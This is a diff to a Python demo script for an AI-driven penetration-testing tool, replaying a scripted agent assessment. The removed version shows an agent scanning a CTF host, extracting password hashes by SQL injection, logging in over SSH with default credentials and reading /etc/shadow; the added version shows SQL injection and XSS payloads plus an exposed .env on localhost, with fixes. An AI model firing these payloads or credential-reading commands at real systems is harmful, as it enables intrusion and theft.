@@ -43,171 +43,146 @@ except ImportError:
 
 
 # ═══════════════════════════════════════════════════════════════════════════
-# Demo Script — a realistic CTF-style assessment
+# Demo Script — a realistic web app assessment
 # ═══════════════════════════════════════════════════════════════════════════
 
-TARGET = "http://10.10.14.7:8080"
+TARGET = "http://localhost:3000"
 
 # Each step: (type, delay_before, **kwargs)
 # Types: text, tool_start, tool_end, finding, usage, phase, plan
 
 DEMO_SCRIPT: list[dict] = [
     # ── Opening analysis ──
-    {"type": "text", "delay": 0.02, "content": "Analyzing target "},
+    {"type": "text", "delay": 0.02, "content": "I'll check "},
     {"type": "text", "delay": 0.02, "content": TARGET},
-    {"type": "text", "delay": 0.02, "content": "... I'll start with reconnaissance to map the attack surface, then probe for vulnerabilities.\n\n"},
+    {"type": "text", "delay": 0.02, "content": " for security issues. Let me start by seeing what's running and looking for common problems.\n\n"},
 
-    # ── Phase: RECON ──
+    # ── Phase: DISCOVERY ──
     {"type": "plan", "delay": 0.3, "content": (
-        "Attack Plan\n"
-        "[ ] Phase 1: RECON — Map the attack surface\n"
-        "    Objective: Enumerate ports, endpoints, technologies\n"
-        "[ ] Phase 2: EXPLOIT — Test confirmed vulnerabilities\n"
-        "    Objective: Achieve code execution or data access\n"
-        "[ ] Phase 3: POST-EXPLOIT — Escalate and pivot\n"
-        "    Objective: Full system compromise"
+        "Testing Plan\n"
+        "[ ] Phase 1: DISCOVERY — See what's running\n"
+        "    Objective: Find open ports, pages, and technologies\n"
+        "[ ] Phase 2: SECURITY TESTING — Check for vulnerabilities\n"
+        "    Objective: Test inputs, forms, and endpoints\n"
+        "[ ] Phase 3: RESULTS — Summarize findings\n"
+        "    Objective: Explain what's wrong and how to fix it"
     )},
 
-    # Tool 1: Nmap
-    {"type": "tool_start", "delay": 0.4, "name": "run_command",
-     "args": {"command": "nmap -sV -sC -p- 10.10.14.7", "timeout": 60}},
-    {"type": "tool_end", "delay": 1.2, "name": "run_command",
-     "result": '{"stdout": "PORT     STATE SERVICE  VERSION\\n22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu\\n80/tcp   open  http     Apache 2.4.41\\n3306/tcp open  mysql    MySQL 5.7.38\\n8080/tcp open  http     Werkzeug 2.1.2 (Python 3.8.10)\\n\\nService Info: OS: Linux", "stderr": "", "exit_code": 0}'},
+    # Tool 1: HTTP probe
+    {"type": "tool_start", "delay": 0.4, "name": "http",
+     "args": {"method": "GET", "url": f"{TARGET}/"}},
+    {"type": "tool_end", "delay": 0.8, "name": "http",
+     "result": '{"status_code": 200, "headers": {"server": "Express", "x-powered-by": "Express"}, "body": "<html><title>My Vibe App</title>..."}'},
 
-    {"type": "text", "delay": 0.02, "content": "Found 4 open ports. Port 8080 is a Python Werkzeug app — "},
-    {"type": "text", "delay": 0.02, "content": "high priority target. Let me enumerate endpoints.\n\n"},
+    {"type": "text", "delay": 0.02, "content": "Node.js Express app detected. The `X-Powered-By: Express` header is exposed — "},
+    {"type": "text", "delay": 0.02, "content": "this reveals the exact framework to potential attackers. Checking for exposed files.\n\n"},
 
-    # Tool 2: Directory brute
-    {"type": "tool_start", "delay": 0.3, "name": "http_request",
-     "args": {"method": "GET", "url": f"{TARGET}/robots.txt"}},
-    {"type": "tool_end", "delay": 0.6, "name": "http_request",
-     "result": '{"status_code": 200, "body": "User-agent: *\\nDisallow: /admin\\nDisallow: /api/debug\\nDisallow: /console"}'},
+    # Tool 2: Check exposed files
+    {"type": "tool_start", "delay": 0.3, "name": "http",
+     "args": {"method": "GET", "url": f"{TARGET}/.env"}},
+    {"type": "tool_end", "delay": 0.6, "name": "http",
+     "result": '{"status_code": 200, "body": "DATABASE_URL=postgresql://admin:supersecret123@db:5432/myapp\\nJWT_SECRET=mysecretkey123\\nSTRIPE_SECRET_KEY=sk_live_abc123..."}'},
 
-    {"type": "text", "delay": 0.02, "content": "Interesting — `/admin`, `/api/debug`, and `/console` exposed in robots.txt. "},
-    {"type": "text", "delay": 0.02, "content": "The `/console` path suggests a Werkzeug debug console. Let me check.\n\n"},
-
-    # Tool 3: Check console
-    {"type": "tool_start", "delay": 0.3, "name": "http_request",
-     "args": {"method": "GET", "url": f"{TARGET}/console"}},
-    {"type": "tool_end", "delay": 0.5, "name": "http_request",
-     "result": '{"status_code": 200, "body": "<title>Werkzeug Debugger</title>\\n<p>The debugger is active and allows code execution.</p>"}'},
-
-    {"type": "text", "delay": 0.02, "content": "**Werkzeug debugger is exposed and unprotected.** This is a critical finding — it allows arbitrary Python code execution on the server.\n\n"},
+    {"type": "text", "delay": 0.02, "content": "**The .env file is publicly accessible.** It contains database credentials, the JWT secret, and a live Stripe API key. "},
+    {"type": "text", "delay": 0.02, "content": "Anyone on the internet can read this. Critical severity.\n\n"},
 
     # Finding 1
     {"type": "finding", "delay": 0.1, "finding": Finding(
-        title="Werkzeug Debug Console — Unauthenticated RCE",
+        title="Environment File Exposed — Database & API Keys Leaked",
         severity="critical",
-        description="Werkzeug debugger is exposed at /console without authentication. An attacker can execute arbitrary Python code on the server, leading to full system compromise. Remediation: Disable debug mode in production (FLASK_DEBUG=0).",
-        evidence=f"GET {TARGET}/console → 200 OK with active debugger",
+        description="The .env file is accessible at /.env without authentication. It exposes database credentials (admin:supersecret123), the JWT signing secret, and a live Stripe API key. An attacker can use these to access the database directly, forge authentication tokens, and make charges on the Stripe account.\n\nFix: Block .env in the Express static file config or add a deny rule in the reverse proxy (nginx/Apache). Rotate ALL exposed credentials immediately.",
+        evidence=f"GET {TARGET}/.env → 200 OK with DATABASE_URL, JWT_SECRET, STRIPE_SECRET_KEY",
     )},
 
     # Usage after first batch
     {"type": "usage", "delay": 0.1, "input_tokens": 2847, "output_tokens": 412},
 
     # ── Phase transition ──
-    {"type": "phase", "delay": 0.5, "completed": "RECON", "next": "EXPLOIT"},
+    {"type": "phase", "delay": 0.5, "completed": "DISCOVERY", "next": "SECURITY TESTING"},
 
-    # Tool 4: SQLi check
-    {"type": "text", "delay": 0.02, "content": "Moving to exploitation. Let me test the `/api/debug` endpoint for SQL injection.\n\n"},
+    # Tool 3: Test login for SQLi
+    {"type": "text", "delay": 0.02, "content": "Testing the login form for SQL injection (injecting database commands through input fields).\n\n"},
 
-    {"type": "tool_start", "delay": 0.3, "name": "http_request",
-     "args": {"method": "GET", "url": f"{TARGET}/api/debug?id=1' OR '1'='1"}},
-    {"type": "tool_end", "delay": 0.7, "name": "http_request",
-     "result": '{"status_code": 200, "body": "[{\\"id\\": 1, \\"username\\": \\"admin\\", \\"email\\": \\"admin@internal.htb\\", \\"role\\": \\"superadmin\\"}, {\\"id\\": 2, \\"username\\": \\"dev\\", \\"email\\": \\"dev@internal.htb\\", \\"role\\": \\"developer\\"}, {\\"id\\": 3, \\"username\\": \\"test\\", \\"email\\": \\"test@internal.htb\\", \\"role\\": \\"user\\"}]"}'},
+    {"type": "tool_start", "delay": 0.3, "name": "http",
+     "args": {"method": "POST", "url": f"{TARGET}/api/auth/login", "data": "{\"email\": \"' OR '1'='1\", \"password\": \"anything\"}"}},
+    {"type": "tool_end", "delay": 0.7, "name": "http",
+     "result": '{"status_code": 200, "body": "{\\"token\\": \\"eyJhbGciOiJIUzI1NiIs...\\", \\"user\\": {\\"id\\": 1, \\"email\\": \\"admin@myvibeapp.com\\", \\"role\\": \\"admin\\"}}"}'},
 
-    {"type": "text", "delay": 0.02, "content": "SQL injection confirmed. The API returns all user records with a basic boolean-based payload. "},
-    {"type": "text", "delay": 0.02, "content": "Let me extract password hashes.\n\n"},
+    {"type": "text", "delay": 0.02, "content": "SQL injection confirmed. Authentication bypass achieved — logged in as admin without knowing the password. "},
+    {"type": "text", "delay": 0.02, "content": "Any account on the application is accessible with this technique.\n\n"},
 
     # Finding 2
     {"type": "finding", "delay": 0.1, "finding": Finding(
-        title="SQL Injection in /api/debug",
+        title="SQL Injection in Login — Any Account Accessible",
         severity="critical",
-        description="Boolean-based blind SQL injection in the `id` parameter allows full database extraction including user credentials. Remediation: Use parameterized queries.",
-        evidence=f"GET {TARGET}/api/debug?id=1' OR '1'='1 → dumps all users",
+        description="The login endpoint at /api/auth/login does not sanitize input. Special characters in the email field bypass authentication, granting access as any user — including admin. Full application access and all user data are exposed.\n\nFix: Use parameterized queries instead of string concatenation. If using Prisma, Sequelize, or Drizzle, ensure query builders are used — not raw SQL.",
+        evidence=f"POST {TARGET}/api/auth/login with email: ' OR '1'='1 → 200 OK with admin token",
     )},
 
-    # Tool 5: Extract passwords
-    {"type": "tool_start", "delay": 0.3, "name": "http_request",
-     "args": {"method": "GET", "url": f"{TARGET}/api/debug?id=1' UNION SELECT username,password,3,4 FROM users--"}},
-    {"type": "tool_end", "delay": 0.8, "name": "http_request",
-     "result": '{"status_code": 200, "body": "[{\\"id\\": \\"admin\\", \\"username\\": \\"$2b$12$LJ3m4ys3Qr2kX8fV7w.mYOqdz2Dj3Pz.Kn1hXxHR7N5C6TdxqR0e\\", \\"email\\": \\"3\\", \\"role\\": \\"4\\"}]"}'},
+    # Tool 4: XSS in search
+    {"type": "text", "delay": 0.02, "content": "Checking the search feature for XSS (cross-site scripting — injecting code into pages).\n\n"},
 
-    {"type": "text", "delay": 0.02, "content": "Got bcrypt hash for admin: `$2b$12$LJ3m4...`. "},
-    {"type": "text", "delay": 0.02, "content": "Let me try default credentials on SSH and the admin panel simultaneously.\n\n"},
+    {"type": "tool_start", "delay": 0.3, "name": "browser_fill",
+     "args": {"selector": "input[name='q']", "value": "<script>alert('hacked')</script>"}},
+    {"type": "tool_end", "delay": 0.5, "name": "browser_fill",
+     "result": '{"success": true, "filled": "input[name=\'q\']"}'},
+
+    {"type": "tool_start", "delay": 0.2, "name": "browser_screenshot",
+     "args": {"filename": "xss_proof.png"}},
+    {"type": "tool_end", "delay": 0.4, "name": "browser_screenshot",
+     "result": '{"screenshot": "evidence/xss_proof.png", "title": "Search Results - My Vibe App"}'},
+
+    {"type": "text", "delay": 0.02, "content": "XSS confirmed — the search page renders user input without sanitizing it. "},
+    {"type": "text", "delay": 0.02, "content": "An attacker could use this to steal user sessions or redirect users to phishing pages.\n\n"},
+
+    # Finding 3
+    {"type": "finding", "delay": 0.1, "finding": Finding(
+        title="Cross-Site Scripting (XSS) in Search",
+        severity="high",
+        description="The search feature renders user input directly on the page without sanitization. A crafted link containing JavaScript will execute in any user's browser when clicked — enabling session theft and account hijacking.\n\nFix: Escape all user input before rendering in HTML. In React, JSX handles this automatically — but check for dangerouslySetInnerHTML usage. Add a Content-Security-Policy header.",
+        evidence=f"Payload: <script>alert('hacked')</script> → rendered and executed in search results",
+    )},
 
     # Usage
     {"type": "usage", "delay": 0.1, "input_tokens": 5193, "output_tokens": 687},
 
-    # Tool 6: SSH attempt
-    {"type": "tool_start", "delay": 0.3, "name": "run_command",
-     "args": {"command": "sshpass -p 'admin123' ssh -o StrictHostKeyChecking=no admin@10.10.14.7 'id && whoami'"}},
-    {"type": "tool_end", "delay": 1.0, "name": "run_command",
-     "result": '{"stdout": "uid=1000(admin) gid=1000(admin) groups=1000(admin),27(sudo)\\nadmin", "stderr": "", "exit_code": 0}'},
+    # Tool 5: Missing security headers
+    {"type": "tool_start", "delay": 0.3, "name": "http",
+     "args": {"method": "GET", "url": f"{TARGET}/"}},
+    {"type": "tool_end", "delay": 0.4, "name": "http",
+     "result": '{"status_code": 200, "headers": {"server": "Express", "x-powered-by": "Express"}, "body": "..."}'},
 
-    {"type": "text", "delay": 0.02, "content": "**SSH access achieved** with `admin:admin123`. The user is in the sudo group — "},
-    {"type": "text", "delay": 0.02, "content": "let me check for privilege escalation.\n\n"},
-
-    # Finding 3
-    {"type": "finding", "delay": 0.1, "finding": Finding(
-        title="Weak Credentials — SSH Root Access",
-        severity="high",
-        description="Default credentials admin:admin123 grant SSH access with sudo group membership, enabling full root escalation. Remediation: Enforce strong password policies and key-based auth.",
-        evidence="sshpass -p 'admin123' ssh admin@10.10.14.7 → uid=1000(admin) groups=sudo",
-    )},
-
-    # ── Phase transition ──
-    {"type": "phase", "delay": 0.5, "completed": "EXPLOIT", "next": "POST-EXPLOIT"},
-
-    # Tool 7: Privesc
-    {"type": "tool_start", "delay": 0.3, "name": "run_command",
-     "args": {"command": "sshpass -p 'admin123' ssh admin@10.10.14.7 'sudo -l'"}},
-    {"type": "tool_end", "delay": 0.6, "name": "run_command",
-     "result": '{"stdout": "User admin may run the following commands on target:\\n    (ALL : ALL) NOPASSWD: ALL", "stderr": "", "exit_code": 0}'},
-
-    {"type": "text", "delay": 0.02, "content": "`sudo NOPASSWD: ALL` — full root access without additional authentication. "},
-    {"type": "text", "delay": 0.02, "content": "This machine is fully compromised.\n\n"},
-
-    # Tool 8: Read flag / sensitive data
-    {"type": "tool_start", "delay": 0.3, "name": "run_command",
-     "args": {"command": "sshpass -p 'admin123' ssh admin@10.10.14.7 'sudo cat /root/flag.txt'"}},
-    {"type": "tool_end", "delay": 0.5, "name": "run_command",
-     "result": '{"stdout": "FLAG{n0_d3bug_1n_pr0d_pl34s3}", "stderr": "", "exit_code": 0}'},
-
-    {"type": "text", "delay": 0.02, "content": "Root flag captured: `FLAG{n0_d3bug_1n_pr0d_pl34s3}`\n\n"},
-
-    # Tool 9: Check for sensitive files
-    {"type": "tool_start", "delay": 0.3, "name": "run_command",
-     "args": {"command": "sshpass -p 'admin123' ssh admin@10.10.14.7 'sudo cat /etc/shadow | head -3'"}},
-    {"type": "tool_end", "delay": 0.4, "name": "run_command",
-     "result": '{"stdout": "root:$6$rounds=656000$abc$xyz...hash:19000:0:99999:7:::\\ndaemon:*:19000:0:99999:7:::\\nbin:*:19000:0:99999:7:::", "stderr": "", "exit_code": 0}'},
+    {"type": "text", "delay": 0.02, "content": "Several important security headers are missing: no Content-Security-Policy, no X-Frame-Options, no Strict-Transport-Security. "},
+    {"type": "text", "delay": 0.02, "content": "Easy wins — one line of code to fix.\n\n"},
 
     # Finding 4
     {"type": "finding", "delay": 0.1, "finding": Finding(
-        title="Sudo NOPASSWD Misconfiguration",
-        severity="high",
-        description="admin user has unrestricted sudo access without password requirement (NOPASSWD: ALL), enabling instant root escalation. Remediation: Apply principle of least privilege.",
-        evidence="sudo -l → (ALL : ALL) NOPASSWD: ALL",
+        title="Missing Security Headers",
+        severity="medium",
+        description="The application does not set several important security headers: Content-Security-Policy (prevents XSS), X-Frame-Options (prevents clickjacking), Strict-Transport-Security (forces HTTPS). These are simple to add and significantly improve security.\n\nFix: Install the `helmet` npm package and add `app.use(helmet())` to the Express app. This sets all headers automatically in one line.",
+        evidence=f"GET {TARGET}/ → Missing: CSP, X-Frame-Options, HSTS, X-Content-Type-Options",
     )},
 
     # Finding 5
     {"type": "finding", "delay": 0.1, "finding": Finding(
-        title="Exposed robots.txt Reveals Internal Paths",
+        title="Technology Fingerprinting — X-Powered-By Header",
         severity="low",
-        description="robots.txt exposes sensitive internal paths including /admin, /api/debug, and /console. Remediation: Remove or restrict robots.txt in production.",
-        evidence=f"GET {TARGET}/robots.txt → Disallow: /admin, /api/debug, /console",
+        description="The X-Powered-By: Express header is present, revealing the exact framework in use. This information helps attackers identify framework-specific exploits.\n\nFix: Add `app.disable('x-powered-by')` or use the helmet package.",
+        evidence=f"GET {TARGET}/ → X-Powered-By: Express",
     )},
 
     # Final usage
     {"type": "usage", "delay": 0.1, "input_tokens": 8421, "output_tokens": 1253},
 
     # ── Phase transition: done ──
-    {"type": "phase", "delay": 0.5, "completed": "POST-EXPLOIT", "next": ""},
+    {"type": "phase", "delay": 0.5, "completed": "SECURITY TESTING", "next": "RESULTS"},
 
-    {"type": "text", "delay": 0.02, "content": "Assessment complete. Full system compromise achieved through three attack chains:\n"},
-    {"type": "text", "delay": 0.02, "content": "1. Werkzeug debug console → RCE\n"},
-    {"type": "text", "delay": 0.02, "content": "2. SQL injection → credential extraction\n"},
-    {"type": "text", "delay": 0.02, "content": "3. Default credentials → SSH → sudo root\n\n"},
+    {"type": "text", "delay": 0.02, "content": "Assessment complete. Summary of findings:\n"},
+    {"type": "text", "delay": 0.02, "content": "1. .env file publicly accessible — credentials exposed (critical, rotate keys immediately)\n"},
+    {"type": "text", "delay": 0.02, "content": "2. SQL injection in login — full authentication bypass (critical)\n"},
+    {"type": "text", "delay": 0.02, "content": "3. XSS in search — session theft possible (high)\n"},
+    {"type": "text", "delay": 0.02, "content": "4. Missing security headers — one-line fix with helmet (medium)\n\n"},
+    {"type": "text", "delay": 0.02, "content": "Priority: fix .env exposure and SQL injection first — highest impact.\n\n"},
 ]
 
 
@@ -224,7 +199,10 @@ async def run_demo(console: Console | None = None):
     No API keys, no Docker, no real target needed.
     """
     if console is None:
-        console = Console(theme=CYBERPUNK_THEME if CYBERPUNK_THEME else None)
+        console = Console(
+            theme=CYBERPUNK_THEME if CYBERPUNK_THEME else None,
+            color_system="truecolor",
+        )
 
     renderer = StreamRenderer(console)
     tool_number = 0
@@ -283,7 +261,7 @@ async def run_demo(console: Console | None = None):
 
         elif step["type"] == "plan":
             content = step["content"]
-            console.print(f"\n  [{CYBER_PURPLE}]◆ ATTACK PLAN[/]")
+            console.print(f"\n  [{CYBER_PURPLE}]◆ TESTING PLAN[/]")
             for raw_line in content.split("\n"):
                 line = raw_line.strip()
                 if not line:
@@ -306,7 +284,7 @@ async def run_demo(console: Console | None = None):
 
     # ── Assessment complete card ──
     duration = time.monotonic() - demo_start
-    total_cost = 0.0032  # Simulated cost (~$0.003 for DeepSeek)
+    total_cost = 0.12  # Simulated cost matching real-world DeepSeek pricing
 
     renderer.assessment_complete(
         target=TARGET,
@@ -318,9 +296,11 @@ async def run_demo(console: Console | None = None):
 
     # ── Demo outro ──
     console.print()
-    console.print(f"  [{GHOST_GRAY}]This was a demo replay — no real systems were targeted.[/]")
-    console.print(f"  [{MATRIX_GREEN}]Install: pip install numasec[/]")
-    console.print(f"  [{GHOST_GRAY}]GitHub:  https://github.com/FrancescoStabile/numasec[/]")
+    console.print(f"  [{GHOST_GRAY}]This was a demo — no real systems were tested.[/]")
+    console.print(f"  [{MATRIX_GREEN}]Run it on a real target — set an API key and go:[/]")
+    console.print(f"  [{GHOST_GRAY}]  export DEEPSEEK_API_KEY=\"sk-...\"[/]")
+    console.print(f"  [{GHOST_GRAY}]  numasec[/]")
+    console.print(f"  [{GHOST_GRAY}]GitHub: https://github.com/FrancescoStabile/numasec[/]")
     console.print()
 
 
